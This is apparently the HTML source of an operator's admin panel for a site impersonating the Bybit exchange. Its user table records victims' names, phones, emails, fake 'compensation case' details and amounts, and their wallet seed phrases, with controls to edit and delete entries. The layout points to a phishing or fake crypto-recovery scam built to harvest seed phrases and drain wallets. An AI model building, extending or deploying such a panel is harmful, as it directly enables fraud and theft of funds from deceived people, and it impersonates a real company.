<!DOCTYPE html>
<html lang="ru">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>ByBit — Админка</title>

    <!-- Tailwind v3 CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="js/tailwindConfig.js"></script>

    <script type="module" src="js/boot.js"></script>

    <!-- Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap"
      rel="stylesheet"
    />

    <!-- Custom CSS -->
    <link rel="stylesheet" href="style/app.css" />
    <script src="/env.js"></script>
  </head>
  <body
    class="bg-base-900 text-ink-500 selection:bg-accent-500/20 selection:text-ink-700 min-h-screen flex flex-col"
  >
    <!-- Header -->
    <header
      class="sticky top-0 z-40 border-b border-white/5 bg-base-900/85 backdrop-blur"
    >
      <div class="max-w-6xl mx-auto px-4 py-3 flex items-center gap-6">
        <a href="register.html" class="flex items-center gap-2 group">
          <img
            src="img/logo.webp"
            alt="ByBit"
            class="h-8 w-auto md:h-9 shrink-0 select-none"
          />
        </a>
        <nav class="ml-auto hidden md:flex items-center gap-6 text-sm">
          <a class="hover:text-ink-700" href="register.html">Регистрация</a>
          <a class="hover:text-ink-700" href="#" data-nav-auth></a>
          <a
            class="inline-flex items-center gap-2 rounded-lg bg-accent-500 px-4 py-2 text-base-900 font-semibold shadow-soft hover:bg-accent-600 transition"
            href="dashboard.html"
            data-nav-cabinet
            >Личный кабинет</a
          >
        </nav>
        <button
          class="md:hidden ml-auto rounded-lg ring-1 ring-white/10 px-3 py-1.5 text-sm"
          onclick="document.getElementById('mnav').classList.toggle('hidden')"
        >
          Меню
        </button>
      </div>
      <div id="mnav" class="md:hidden hidden border-t border-white/5">
        <div class="max-w-6xl mx-auto px-4 py-3 flex flex-col gap-3 text-sm">
          <a class="text-left" href="register.html">Регистрация</a>
          <a class="text-left" href="#" data-nav-auth></a>
          <a
            class="inline-flex items-center justify-center rounded-lg bg-accent-500 px-4 py-2 text-base-900 font-semibold shadow-soft hover:bg-accent-600 transition"
            href="dashboard.html"
            data-nav-cabinet
            >Личный кабинет</a
          >
        </div>
      </div>
    </header>

    <!-- Main -->
    <main
      id="admin-root"
      class="hidden max-w-6xl mx-auto px-4 py-10 space-y-6 flex-grow"
    >
      <h1 class="text-2xl sm:text-3xl font-semibold text-ink-700">
        Административная панель
      </h1>

      <!-- Панель действий -->
      <section
        class="rounded-2xl border border-white/5 bg-base-800 p-4 shadow-soft"
      >
        <div
          class="flex flex-col sm:flex-row gap-3 sm:items-center sm:justify-between"
        >
          <div class="flex gap-3">
            <input
              id="admin-search"
              type="text"
              placeholder="Поиск по имени, email, номеру дела…"
              class="w-full sm:w-80 rounded-xl bg-base-700 border border-white/10 px-3 py-2 text-ink-700 placeholder:opacity-40 focus:outline-none focus:ring-2 focus:ring-accent-500/50"
            />
            <button
              id="admin-refresh"
              class="rounded-xl ring-1 ring-white/10 px-4 py-2 font-medium hover:bg-white/5 transition"
            >
              Обновить
            </button>
          </div>
          <div class="text-sm text-ink-300">
            Всего пользователей: <span id="admin-count">0</span>
          </div>
        </div>
      </section>

      <!-- Таблица пользователей -->
      <section
        class="rounded-2xl border border-white/5 bg-base-800 p-0 shadow-soft overflow-hidden"
      >
        <div class="overflow-x-auto">
          <table class="min-w-full text-sm">
            <thead class="bg-base-700/60 text-ink-400">
              <tr>
                <th class="px-4 py-3 text-left">Статус</th>
                <th class="px-4 py-3 text-left">Имя</th>
                <th class="px-4 py-3 text-left">Фамилия</th>
                <th class="px-4 py-3 text-left">Телефон</th>
                <th class="px-4 py-3 text-left">Email</th>
                <th class="px-4 py-3 text-left">Номер дела</th>
                <th class="px-4 py-3 text-left">Источник компенсации</th>
                <th class="px-4 py-3 text-left">Инициатор</th>
                <th class="px-4 py-3 text-left">Сумма</th>
                <th class="px-4 py-3 text-left">Сид-фраза</th>
                <th class="px-4 py-3 text-right">Действия</th>
              </tr>
            </thead>
            <tbody id="admin-tbody" class="divide-y divide-white/5"></tbody>
          </table>
        </div>
      </section>
    </main>

    <!-- Footer -->
    <footer
      class="max-w-6xl mx-auto px-4 pb-10 text-center text-xs text-ink-300"
    >
      © 2018-2025 Bybit. Все права защищены
    </footer>

    <!-- Шаблон строки -->
    <template id="tpl-admin-row">
      <tr data-id="">
        <td class="px-4 py-3">
          <label class="inline-flex items-center gap-2 cursor-pointer">
            <input
              type="checkbox"
              class="accent-amber-400"
              data-action="toggle-active"
            />
            <span
              class="text-xs rounded px-2 py-1 ring-1 ring-white/10"
              data-cell="activeBadge"
              >Неактивен</span
            >
          </label>
        </td>
        <td class="px-4 py-3" data-cell="firstName"></td>
        <td class="px-4 py-3" data-cell="lastName"></td>
        <td class="px-4 py-3" data-cell="phone"></td>
        <td class="px-4 py-3" data-cell="email"></td>
        <td class="whitespace-nowrap px-4 py-3" data-cell="caseNumber"></td>
        <td class="px-4 py-3" data-cell="compensationSource"></td>
        <td class="px-4 py-3" data-cell="compensationInitiator"></td>
        <td
          class="whitespace-nowrap px-4 py-3"
          data-cell="compensationAmount"
        ></td>
        <td
          class="whitespace-nowrap px-4 py-3 max-w-[260px] truncate"
          title=""
          data-cell="seedPhrase"
        ></td>
        <td class="px-4 py-3 text-right">
          <div class="inline-flex items-center gap-2">
            <button
              class="rounded-lg ring-1 ring-white/10 px-3 py-1.5 hover:bg-white/5 transition"
              data-action="edit"
            >
              Редактировать
            </button>
            <button
              class="rounded-lg bg-red-500/20 text-red-300 px-3 py-1.5 ring-1 ring-red-500/30 hover:bg-red-500/30 transition"
              data-action="delete"
            >
              Удалить
            </button>
          </div>
        </td>
      </tr>
    </template>

    <!-- Шаблон строки в режиме редактирования -->
    <template id="tpl-admin-row-edit">
      <tr data-id="">
        <td class="px-4 py-3 align-top">
          <label class="inline-flex items-center gap-2 cursor-pointer">
            <input
              type="checkbox"
              class="accent-amber-400"
              data-action="toggle-active"
            />
            <span
              class="text-xs rounded px-2 py-1 ring-1 ring-white/10"
              data-cell="activeBadge"
              >Неактивен</span
            >
          </label>
        </td>
        <td class="px-4 py-2">
          <input
            class="w-40 rounded bg-base-700 border border-white/10 px-2 py-1"
            data-edit="firstName"
          />
        </td>
        <td class="px-4 py-2">
          <input
            class="w-44 rounded bg-base-700 border border-white/10 px-2 py-1"
            data-edit="lastName"
          />
        </td>
        <td class="px-4 py-2">
          <input
            class="w-44 rounded bg-base-700 border border-white/10 px-2 py-1"
            data-edit="phone"
          />
        </td>
        <td class="px-4 py-2">
          <input
            class="w-56 rounded bg-base-700 border border-white/10 px-2 py-1"
            data-edit="email"
          />
        </td>
        <td class="px-4 py-2">
          <input
            class="w-32 rounded bg-base-700 border border-white/10 px-2 py-1"
            data-edit="caseNumber"
            placeholder="#123-4567"
          />
        </td>
        <td class="px-4 py-2">
          <input
            class="w-48 rounded bg-base-700 border border-white/10 px-2 py-1"
            data-edit="compensationSource"
          />
        </td>
        <td class="px-4 py-2">
          <input
            class="w-48 rounded bg-base-700 border border-white/10 px-2 py-1"
            data-edit="compensationInitiator"
          />
        </td>
        <td class="px-4 py-2">
          <input
            class="w-32 rounded bg-base-700 border border-white/10 px-2 py-1"
            data-edit="compensationAmount"
            placeholder="1000 USDT"
          />
        </td>
        <td class="px-4 py-2">
          <input
            class="w-64 rounded bg-base-700 border border-white/10 px-2 py-1"
            data-edit="seedPhrase"
            placeholder="слова через пробел"
          />
        </td>
        <td class="px-4 py-2 text-right">
          <div class="inline-flex items-center gap-2">
            <button
              class="rounded-lg bg-emerald-500/90 text-base-900 px-3 py-1.5 shadow-soft hover:bg-emerald-600 transition"
              data-action="save"
            >
              Сохранить
            </button>
            <button
              class="rounded-lg ring-1 ring-white/10 px-3 py-1.5 hover:bg-white/5 transition"
              data-action="cancel"
            >
              Отмена
            </button>
          </div>
        </td>
      </tr>
    </template>

    <!-- Pending overlay -->
    <div
      id="pending-overlay"
      class="hidden fixed inset-0 z-50 bg-black/60 backdrop-blur-sm"
    >
      <div class="h-full w-full flex items-center justify-center">
        <div
          class="flex flex-col items-center gap-4 rounded-2xl bg-base-800/90 px-8 py-7 ring-1 ring-white/10 shadow-2xl"
        >
          <!-- Спиннер -->
          <div
            class="h-10 w-10 rounded-full border-2 border-white/20 border-t-white animate-spin"
          ></div>
          <div id="pending-text" class="text-ink-200 text-sm">
            Выполняем запрос…
          </div>
        </div>
      </div>
    </div>
  </body>
</html>
